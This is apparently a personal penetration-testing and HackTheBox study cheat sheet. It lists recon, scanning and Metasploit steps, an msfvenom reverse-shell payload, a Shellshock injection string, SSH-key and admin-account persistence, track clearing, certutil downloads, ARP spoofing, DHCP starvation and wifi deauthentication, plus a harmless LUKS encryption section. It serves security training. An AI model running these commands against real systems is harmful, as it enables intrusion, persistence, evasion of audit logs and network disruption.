# Phases
1. Recon
2. Scanning 
3. Gaining access
4. Maintaining access
5. Clearing tracks

# chains 
1. get access
   1. searchsploit
2. escalate access
3. upload rat
4. execute rat
5. deploy rat
   1. msfvenom cheat sheet aspx
6. clear tracks

# Recon
- theharvester -d $domain -l 500 -b google
- OSRFramework
  - usufy.py -n $target
  - mailfy.py -n $target # also checks if theyve been leaked
  - searchfy.py -n $target
  - domainfy.py -n $target
- nikto -host $ip
  - nmap -p80,443 $subnet -oG -  | nikto -h-
- openVAS ~nessus,   Greenbone Sec Assistant (gsad) GUI
  - apt install openvas
  - openvas-setup
  - omp -? 


# hack the box
- https://www.hackthebox.eu/home/rules
- https://www.hackthebox.eu/home/htb/access
  - OpenVPN
  - nmap -sC -sV 10.10.10.79
  - nmap --script vuln -oA nmap/vulnscan 10.10.10.79
  - sslyze --heartbleed 10.10.10.79:443
  - gobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
  - burp suite community edition
  - 
## Hack examples
- https://www.youtube.com/watch?v=JZN3JhoAdWo
- https://medium.com/bugbountywriteup/valentine-a-hackthebox-writeup-f5b731e35138
1. `Recon`
   1. get $IP of target from hackthebox.eu
2. `Scanning` 
   1. nmap $ip                    # better to use msfc db_nmap
      1. 8080/tcp                 # browse via web
   2. nmap -A -T4 -p- $ip         # ALL scan, OS/ver/script/traceroute detection.
      1.  5min to an hour
   3. nmap -sU -T4 -p1-1000 $ip   # 1000 UDP ports
   4. Leads
      1. smb                      # 139/tcp ntbios-ssnn
      2. ftp                        
      3. web app
   5. google search $lead exploit 
      1. exploit-db.com
      2. rapid7.com
      3. AutoBlue-MS17010 coded example
3. `Gaining access`
   1. msfconsole                  # Rapid7 Metasploit
      1. search $lead           # $keyword
      2. search $exploit-keyword-or-id
      3. use $exploit/aux
      4. info
      5. options
      6. show
      7. set $var $value
      8. exploit or run
   2. nessus??
4. `Maintaining access`
   1. meterpreter               # reverse shell
      1. getuid #windows command
      2. sysinfo
      3. help
      4. getsystem
      5. hashdump # get the SAM, pass hashes?
      6. find user.txt, or root.txt and submit to hackthebox.eu
      7. background
      8. search suggester
   2. msfvenom -p java/jsp_shell_reverse_tcp LHOST=$myip LPORT=$myport -f war > rat.war
      1. msfconsole
         1. use exploit/multi/handler
         2. set payload windows/x64/???
   3. nc -nvlp 1234 #netcat
      1. no tty # https://netsec.ws/?p=337
      2. escalate privlages
         1. sudo -u $user /bin/bash
         2. http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
   4. `testing callbacks`
      1. shellshock
         1. () { :; }; /bin/bash -c "ping -c 3 $myip; id;"
      2. sudo tcptump -i eth9 -n icmp
   5. `keeping access `
      1. if `root`, create another admin user
      2. use tools on server to setup ssh server
      3. create keys
         1. cd .ssh
         2. echo $id_rsa.pub >> authorized_keys 
         3. known_hosts??
         4. ssh to box
         5. scp user@ip:/path . 
5. `Clearing tracks`
   1. CCleaner
   2. Auditpol
6. Capture the flag (CTF)
   1. tag web with contents of user.txt


# Leads
1. ftp
   1. get/put $file
2. smb                                          # found smb service
   1. smbclient -L \\\\$ip\\      
      1. try to crawl folders
3.  web app
   2. default apps
      1. try default credential lists
         1. google app names and default credentials
         2. try in burp suite
   3. dirbuster&  # OWASP DirBuster
      1. /usr/share/wordlists/dirbuster/dir??    #list based
         1. iis7 ext "asm,asmx,asp,aspx"
4. linux
   1. quick http
      1. python -m SimpleHTPServer 80
5. windows privliaged escalation
   1. wget for windws
      1. certutil -urlcache -f $url
   2. windows expliot suggester
   3. https://www.fuzzysecurity.com/tutorials/16.html
      1. rasta-mouse / sherlock or watson

# encrypt the drive
sudo yum install cryptsetup-luks
sudo fdisk -l
sudo cryptsetup -y -v luksFormat <DEVICE_NAME>; #asks for passphrase
sudo cryptsetup luksOpen <DEVICE_NAME>; LA
sudo cryptsetup -v status LA
sudo cryptsetup luksDump <DEVICE_NAME>
sudo dd if=/dev/zero of=/dev/mapper/LA bs=128
sudo mkfs.ext4 /dev/mapper/LA
mkdir LA
sudo mount /dev/mapper/LA LA/
sudo umount LA/
sudo cryptsetup luksClose LA

# whois
geoip-bin
geoiplookup $ip

# arp poisoning
- ip forwarding on
- keeps telling target that the your host is the gw. 
echo 1 > /proc/sys/net/ipv4/ip_forward
ip route # get ip of router =$routerip
arpspoof -i eth0 -t $targetip -$routerip 
#use wireshark ip.addr == $targetip

# dhcp starvation = DoS
net-dhcp-leases default
dhcpstarv -i eth0
yersinia 

# wireless hacking
https://www.aircrack-ng.org/
wifi Monitoring mode? 
airmon-ng start $wifiadapter # from ifconfig
airodump-ng $newinterfacename
airodump-ng -c $ch --bssid $MAC -w capture $newinterfacename
airreplay-ng --deauth 0 -a -$MACap -c $MAC

# notes
smtp, expn

